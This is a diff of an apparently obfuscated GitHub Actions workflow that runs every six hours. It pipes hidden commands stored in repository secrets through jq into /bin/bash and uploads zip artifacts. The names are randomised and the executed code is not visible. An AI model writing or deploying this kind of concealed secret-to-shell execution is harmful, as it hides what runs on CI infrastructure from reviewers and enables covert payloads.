@@ -1,24 +1,25 @@
 name: zongjiangmingliang
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '46 0/6 * * *'
-jobs:  # 29074
+    - cron: '8 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zongjiangmingliang
         env:
-          q176: ${{ secrets.q176 }}
+          jknw285: ${{ secrets.jknw285 }}
         run: |
-          echo $q176 | jq -r .kud9 | /bin/bash
-          echo $czicx6434 | jq -r .vizwm08855 | /bin/bash
-          echo $nbkl20170 | jq -r .za495 | /bin/bash
-          echo $xt87 | jq -r .ztrsj8248 | /bin/bash
-          echo $on57575 | jq -r .lanpb48222 | /bin/bash
-          echo $lycim9512 | jq -r .wzobn31410 | /bin/bash
-          echo $tpq145 | jq -r .ypnar1 | /bin/bash
-          echo $jrci42 | jq -r .gg230 | /bin/bash
+          printf '%s' "$jknw285" | jq -r .bwyp6565 | /bin/bash
+          echo $gs42848 | jq -r .eenes7609 | /bin/bash
+          echo $srp85 | jq -r .yge0 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6zlaFnaw
+          path: "*.zip"
+          retention-days: 1
